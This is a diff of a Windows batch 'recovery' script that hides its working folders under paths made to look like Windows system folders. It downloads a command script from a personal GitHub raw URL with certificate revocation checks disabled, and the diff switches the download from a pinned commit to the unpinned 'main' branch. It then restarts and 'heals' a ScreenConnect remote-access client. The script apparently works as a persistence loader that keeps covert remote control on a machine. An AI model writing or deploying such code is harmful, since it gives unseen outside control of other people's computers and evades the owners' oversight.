@@ -1,10 +1,10 @@
 @echo off
-rem RECOVER_ONE BUILD R4 - pull G12 + HEAL (schtasks only — no dual PS race). No wmic.
+rem RECOVER_ONE BUILD R5 - pull G13 + HEAL (phantom Installer purge). schtasks only.
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "STAGE=%SystemRoot%\Temp\.upd"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "PIN=397e904"
+set "PIN=main"
 set "FP=36e506ff016b2151"
 set "KEEP=5f6010579852e507"
 set "ALT=f861c8140d453427"
@@ -15,9 +15,9 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
 
 "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 45 -o "%WD%\own_gryxa.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_gryxa.cmd?t=%RANDOM%"
-findstr /C:"OWN_GRYXA BUILD 20260804G12" "%WD%\own_gryxa.cmd"
+findstr /C:"OWN_GRYXA BUILD 20260804G13" "%WD%\own_gryxa.cmd"
 if errorlevel 1 (
-  echo FAIL own_gryxa-not-G12
+  echo FAIL own_gryxa-not-G13
   endlocal & exit /b 2
 )
 
@@ -42,14 +42,7 @@ if /I "%ACTION%"=="fail" (
   if not errorlevel 1 set "ACTION=ps-start"
 )
 
-if /I "%ACTION%"=="fail" (
-  start "" /b cmd.exe /c "%WORKER%"
-  set "ACTION=start-b"
-)
-
-echo G12=OK
+echo G13=OK
 echo ACTION=!ACTION!
-echo QUEUED HEAL - wait 4-5 min (x+wipe+i is slow) then:
-echo   findstr /I /C:"G12" /C:"heal_1060" /C:"wipe_orphan" /C:"heal_1060_ok" /C:"still_down" "%WD%\own_gryxa.log"
-echo   sc query "ScreenConnect Client (%FP%)"
+echo QUEUED - wait 5 min then findstr purge/heal_1060_ok + sc query
 endlocal
